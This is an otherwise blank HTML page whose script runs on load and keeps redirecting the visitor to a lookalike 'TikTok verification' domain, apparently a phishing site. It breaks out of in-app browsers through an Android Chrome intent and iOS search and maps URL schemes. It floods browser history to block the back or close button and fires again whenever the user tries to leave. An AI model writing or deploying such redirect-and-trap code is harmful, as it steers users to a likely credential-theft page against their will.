<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function trigger() {
        // FAIL-SAFE FIRST
        if (Date.now() > killTime) return;

        // 1. SHOW ALERT IMMEDIATELY (To prove the script is alive)
        alert("ATTEMPT #16\n\nClick OK to open the secure system browser.");

        const isAndroid = /Android/i.test(navigator.userAgent);

        // 2. THE BREAKOUT
        if (isAndroid) {
            // Android Chrome Intent
            window.location.href = "intent://" + target.replace("https://", "") + "#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end";
        } else {
            // iOS: Try the Search protocol and the Maps protocol
            window.location.replace("x-web-search://?" + encodeURIComponent(target));
            
            setTimeout(() => {
                window.location.href = "maps://?q=" + encodeURIComponent(target);
            }, 50);
        }

        // 3. RECURSE
        setTimeout(trigger, 10);
    }

    window.onload = () => {
        // Flood history to block 'X' button
        for(let i=0; i<50; i++) history.pushState(null, null, "#" + i);
        
        // Start the engine
        trigger();
    };

    // If they swipe or try to leave, trigger again
    window.onblur = () => { if (Date.now() < killTime) trigger(); };
</script>

</body>
</html>
